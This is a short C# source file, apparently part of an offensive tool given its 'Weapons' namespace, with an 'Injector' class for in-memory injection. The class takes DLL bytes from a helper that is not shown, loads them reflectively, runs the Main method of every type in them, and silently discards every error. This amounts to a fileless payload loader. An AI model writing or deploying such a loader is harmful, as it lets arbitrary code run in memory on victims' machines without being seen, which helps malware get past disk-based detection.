using System;
using System.Reflection;
using System.Threading.Tasks;

namespace Weapons
{
    // In-Memory Injection
    class Injector
    {
        public static async void runAsync(string target)
        {
            byte[] bytes = W_Utils.GetDLLBytes(target);

            if (bytes.Length > 0)
            {
                try
                {
                    var assembly = Assembly.Load(bytes);

                    foreach (var type in assembly.GetTypes())
                    {
                        object instance = Activator.CreateInstance(type);
                        object[] args = new object[] { new string[] { "" } };
                        try
                        {
                            var task = (Task)type.GetMethod("Main").Invoke(instance, args);
                            await task.ConfigureAwait(false);
                        }
                        catch { }
                    }
                }
                catch { }
            }
        }
    }
}
